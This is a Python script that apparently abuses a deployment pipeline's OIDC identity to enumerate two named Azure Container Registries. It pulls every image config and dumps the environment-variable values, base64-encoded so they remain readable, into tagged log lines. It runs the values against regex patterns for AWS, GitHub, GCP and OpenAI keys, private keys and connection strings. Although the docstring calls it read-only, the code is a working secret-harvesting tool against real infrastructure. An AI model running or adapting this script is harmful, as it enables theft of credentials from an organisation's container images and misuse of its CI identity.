#!/usr/bin/env python3
"""C211-I121569: READ-ONLY ACR data-plane enumeration for the two registries whose admin
user is DISABLED (acrsswrulesprod, acrsswrulesstaging), reached with an AAD token minted by
the SSW.Rules '/deploy' OIDC ARM identity. Lists every repository and manifest (ACR
data-plane API + v2 tags), pulls each image config blob and dumps config.Env + history.
Creates / modifies / deletes NOTHING.
Every response is emitted verbatim as a tagged JSON line: C211_I121569 {...}
"""
import base64
import hashlib
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
SID = os.environ.get("C211_SID", "b8b18dcf-d83b-47e2-9886-00c2e983629e")
TAG = os.environ.get("C211_TAG", "C211_I121569")
DEADLINE = int(os.environ.get("C211_DEADLINE", "900"))
T0 = time.time()
REGISTRIES = [
    ("acrsswrulesprod", "SSW.Rules"),
    ("acrsswrulesstaging", "SSW.Rules.Staging"),
]
MAX_REPOS = 30
MAX_CONFIGS_TOTAL = 120
ACC = ", ".join([
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
    "application/vnd.oci.image.index.v1+json",
])
VALUE_PATTERNS = [
    ("aws_akid", re.compile(r"\b(?:AKIA|ASIA)[A-Z0-9]{16}\b")),
    ("github_pat", re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{30,}\b")),
    ("github_pat_fine", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{40,}\b")),
    ("gitlab_pat", re.compile(r"\bglpat-[A-Za-z0-9_-]{18,}\b")),
    ("gcp_sa_json", re.compile(r'"type"\s*:\s*"service_account"')),
    ("gcp_api_key", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("private_key", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("azure_secret_text", re.compile(r"(client_secret|ClientSecret|AZURE_CLIENT_SECRET)\s*[=:]\s*\S{16,}")),
    ("sb_conn", re.compile(r"Endpoint=sb://[^\s\"]+sharedaccesskey=", re.I)),
    ("cosmos_key", re.compile(r"AccountEndpoint=https://[^\s\"]+AccountKey=", re.I)),
    ("storage_conn", re.compile(r"DefaultEndpointsProtocol=https?;AccountName=", re.I)),
    ("openai_key", re.compile(r"\bsk-[A-Za-z0-9]{32,}\b")),
    ("jwt", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.")),
]


def emit(obj):
    try:
        print(TAG + " " + json.dumps(obj, default=str)[:14000], flush=True)
    except Exception:
        print(TAG + ' {"step":"emit-error"}', flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=150):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:  # noqa: BLE001
        return -1, "", str(e)


def classify(v):
    return [n for n, rx in VALUE_PATTERNS if rx.search(v)]


def sha(v):
    return hashlib.sha256(v.encode()).hexdigest()


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, hdrs, newurl):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


def http(url, method="GET", headers=None, body=None, timeout=60, follow=True):
    h = dict(headers or {})
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        if e.code in (301, 302, 303, 307, 308) and follow:
            loc = e.headers.get("Location")
            if loc:
                try:
                    r2 = urllib.request.urlopen(urllib.request.Request(loc), timeout=timeout)
                    return r2.status, dict(r2.headers), r2.read()
                except Exception as e2:  # noqa: BLE001
                    return -1, {}, str(e2).encode()[:200]
        try:
            return e.code, dict(e.headers), e.read()[:600]
        except Exception:
            return e.code, {}, b""
    except Exception as e:  # noqa: BLE001
        return -1, {}, str(e).encode()[:300]


def blob_drop_auth(url, headers, timeout=90):
    """Blob GET: first hop with auth, redirect followed WITHOUT auth."""
    req = urllib.request.Request(url, headers=headers)
    try:
        r = OPENER.open(req, timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        if e.code in (301, 302, 303, 307, 308):
            loc = e.headers.get("Location")
            if not loc:
                return e.code, b""
            try:
                r2 = urllib.request.urlopen(urllib.request.Request(loc), timeout=180)
                return r2.status, r2.read()
            except urllib.error.HTTPError as e2:
                return e2.code, e2.read()[:300]
            except Exception as e2:  # noqa: BLE001
                return -1, str(e2).encode()[:200]
        try:
            return e.code, e.read()[:300]
        except Exception:
            return e.code, b""


def acr_tokens(regf, arm_tok, tenant):
    exch_body = urllib.parse.urlencode({
        "grant_type": "access_token",
        "service": regf,
        "tenant": tenant,
        "access_token": arm_tok,
    }).encode()
    st, hd, body = http(f"https://{regf}/oauth2/exchange",
                        method="POST",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=exch_body)
    emit({"step": "acr-exchange", "registry": regf, "http": st,
          "body": body[:200].decode(errors="replace")})
    if st != 200:
        return None, st
    try:
        refresh = json.loads(body).get("refresh_token")
    except Exception:
        return None, st
    tok_body = urllib.parse.urlencode({
        "grant_type": "refresh_token",
        "service": regf,
        "scope": "registry:catalog:*",
        "refresh_token": refresh,
    }).encode()
    st2, hd2, body2 = http(f"https://{regf}/oauth2/token",
                           method="POST",
                           headers={"Content-Type": "application/x-www-form-urlencoded"},
                           body=tok_body)
    emit({"step": "acr-catalog-token", "registry": regf, "http": st2})
    if st2 != 200:
        return None, st2
    try:
        return json.loads(body2).get("access_token"), st2
    except Exception:
        return None, st2


def repo_token(regf, refresh, repo):
    body = urllib.parse.urlencode({
        "grant_type": "refresh_token",
        "service": regf,
        "scope": f"repository:{repo}:pull",
        "refresh_token": refresh,
    }).encode()
    st, hd, b = http(f"https://{regf}/oauth2/token", method="POST",
                     headers={"Content-Type": "application/x-www-form-urlencoded"}, body=body)
    if st != 200:
        return None
    try:
        return json.loads(b).get("access_token")
    except Exception:
        return None


def main():
    rc, out, err = run(["az", "account", "show", "--output", "json"], timeout=120)
    acct = {}
    if rc == 0:
        try:
            acct = json.loads(out)
        except Exception:
            acct = {}
    emit({"step": "az-account", "rc": rc, "name": acct.get("name"), "id": acct.get("id"),
          "tenantId": acct.get("tenantId"), "user": (acct.get("user") or {}).get("name")})
    rc, out, err = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=180)
    arm = None
    if rc == 0:
        try:
            arm = json.loads(out).get("accessToken")
        except Exception:
            arm = None
    emit({"step": "arm-token", "rc": rc, "has_token": bool(arm), "err": err[:200]})
    tenant = acct.get("tenantId") or ""
    if not arm:
        emit({"step": "ABORT", "reason": "no ARM token"})
        return
    budget = {"configs": 0}
    for reg, rg in REGISTRIES:
        regf = f"{reg}.azurecr.io"
        rl = {"registry": regf, "rg": rg}
        # AAD-based access tokens
        cat_tok, cst = acr_tokens(regf, arm, tenant)
        refresh = None
        # re-do exchange to keep refresh token (acr_tokens returns access token only)
        exch_body = urllib.parse.urlencode({
            "grant_type": "access_token", "service": regf, "tenant": tenant, "access_token": arm,
        }).encode()
        st, hd, body = http(f"https://{regf}/oauth2/exchange", method="POST",
                            headers={"Content-Type": "application/x-www-form-urlencoded"}, body=exch_body)
        if st == 200:
            try:
                refresh = json.loads(body).get("refresh_token")
            except Exception:
                refresh = None
        rl["exchange_refresh_ok"] = bool(refresh)
        # fallback: az acr login --expose-token
        if not cat_tok:
            rc2, out2, err2 = run(["az", "acr", "login", "-n", reg, "--expose-token", "--output", "json"], timeout=180)
            emitted = {"step": "az-acr-expose-token", "registry": reg, "rc": rc2, "err": err2[:200]}
            try:
                j = json.loads(out2)
                emitted["has_token"] = bool(j.get("accessToken"))
                cat_tok = j.get("accessToken")
            except Exception:
                emitted["has_token"] = False
            emit(emitted)
        # ARM-side repository list (management plane cross-check)
        arm_url = (f"{ARM}/subscriptions/{SID}/resourceGroups/{rg}/providers/"
                   f"Microsoft.ContainerRegistry/registries/{reg}/repositories?api-version=2019-08-15")
        st, hd, body = http(arm_url, headers={"Authorization": "Bearer " + arm})
        repos_arm = []
        if st == 200:
            try:
                j = json.loads(body)
                repos_arm = [x.get("name") for x in (j.get("value") or [])]
            except Exception:
                pass
        emit({"step": "arm-repos", "registry": reg, "http": st, "n": len(repos_arm),
              "repos": repos_arm[:MAX_REPOS], "err": body[:200].decode(errors="replace") if st != 200 else None})
        # data-plane catalog
        repos = []
        if cat_tok:
            st, hd, body = http(f"https://{regf}/v2/_catalog?n=100", headers={"Authorization": "Bearer " + cat_tok})
            if st == 200:
                try:
                    repos = json.loads(body).get("repositories") or []
                except Exception:
                    repos = []
            emit({"step": "catalog", "registry": reg, "http": st, "n": len(repos), "repos": repos[:MAX_REPOS],
                  "body": body[:200].decode(errors="replace") if st != 200 else None})
        if not repos:
            repos = repos_arm
        rl["repos"] = repos
        for repo in repos[:MAX_REPOS]:
            if left() < 60:
                emit({"step": "deadline-stop", "registry": reg, "repo": repo}); break
            rt = repo_token(regf, refresh, repo) if refresh else None
            if not rt and cat_tok:
                rt = cat_tok
            man = []
            # ACR data-plane manifest list
            st, hd, body = http(f"https://{regf}/acr/v1/{repo}/_manifests?n=100",
                                headers={"Authorization": "Bearer " + rt})
            if st == 200:
                try:
                    man = json.loads(body).get("manifests") or []
                except Exception:
                    man = []
            emit({"step": "repo-manifests", "registry": reg, "repo": repo, "http": st, "n": len(man),
                  "types": {m.get("mediaType"): 1 for m in man[:1]} if man else {},
                  "sample": [{"d": m.get("digest"), "t": m.get("mediaType"), "tags": m.get("tags"),
                              "sz": m.get("imageSize")} for m in man[:12]],
                  "body": body[:200].decode(errors="replace") if st != 200 else None})
            # tags (v2)
            st, hd, body = http(f"https://{regf}/v2/{repo}/tags/list?n=100",
                                headers={"Authorization": "Bearer " + rt})
            tags = []
            if st == 200:
                try:
                    tags = json.loads(body).get("tags") or []
                except Exception:
                    tags = []
            emit({"step": "repo-tags", "registry": reg, "repo": repo, "http": st, "tags": tags[:40]})
            # resolve image manifests -> config digests -> config blobs
            targets = []
            for m in man:
                mt = m.get("mediaType") or ""
                if "image.manifest" in mt:
                    targets.append(m.get("digest"))
            targets = targets[:40]
            for dg in targets:
                if left() < 45:
                    break
                if budget["configs"] >= MAX_CONFIGS_TOTAL:
                    emit({"step": "config-budget-reached"}); break
                st, hd, body = http(f"https://{regf}/v2/{repo}/manifests/{dg}",
                                    headers={"Authorization": "Bearer " + rt, "Accept": ACC})
                if st != 200:
                    emit({"step": "manifest", "registry": reg, "repo": repo, "digest": dg,
                          "http": st, "err": body[:160].decode(errors="replace")}); continue
                try:
                    mj = json.loads(body)
                except Exception:
                    continue
                if "index" in (mj.get("mediaType") or ""):
                    kids = mj.get("manifests") or []
                    chosen = None
                    for c in kids:
                        if (c.get("platform") or {}).get("architecture") == "amd64":
                            chosen = c.get("digest"); break
                    if chosen:
                        st2, hd2, body2 = http(f"https://{regf}/v2/{repo}/manifests/{chosen}",
                                               headers={"Authorization": "Bearer " + rt, "Accept": ACC})
                        if st2 != 200:
                            emit({"step": "child", "registry": reg, "repo": repo, "digest": chosen,
                                  "http": st2, "err": body2[:160].decode(errors="replace")}); continue
                        try:
                            mj = json.loads(body2)
                        except Exception:
                            continue
                cfg = (mj.get("config") or {}).get("digest")
                if not cfg:
                    continue
                st3, cbody = blob_drop_auth(f"https://{regf}/v2/{repo}/blobs/{cfg}",
                                            {"Authorization": "Bearer " + rt})
                budget["configs"] += 1
                rec = {"step": "image-config", "registry": reg, "repo": repo, "manifest": dg,
                       "config": cfg, "blob_http": st3, "len": len(cbody)}
                if st3 == 200:
                    try:
                        cj = json.loads(cbody)
                        conf = cj.get("config") or {}
                        env = conf.get("Env") or []
                        rec["env_count"] = len(env)
                        rec["env"] = []
                        for e in env:
                            name, _, val = e.partition("=")
                            rec["env"].append({"name": name, "len": len(val),
                                               "sha256": sha(val) if val else None,
                                               "b64": base64.b64encode(val.encode()).decode() if val else "",
                                               "matches": classify(val)})
                        rec["history"] = [{"created_by": (h.get("created_by") or "")[:300]} for h in (cj.get("history") or [])]
                        rec["labels"] = conf.get("Labels") or {}
                        rec["user"] = conf.get("User") or ""
                        rec["created"] = cj.get("created")
                    except Exception as ex:  # noqa: BLE001
                        rec["parse_err"] = str(ex)[:120]
                else:
                    rec["err"] = cbody[:200].decode(errors="replace")
                emit(rec)
        emit({"step": "registry-done", "registry": reg, "repos": len(repos), "configs": budget["configs"],
              "left_s": round(left(), 1)})
    emit({"step": "DONE", "configs_total": budget["configs"], "elapsed_s": round(time.time() - T0, 1)})


if __name__ == "__main__":
    main()
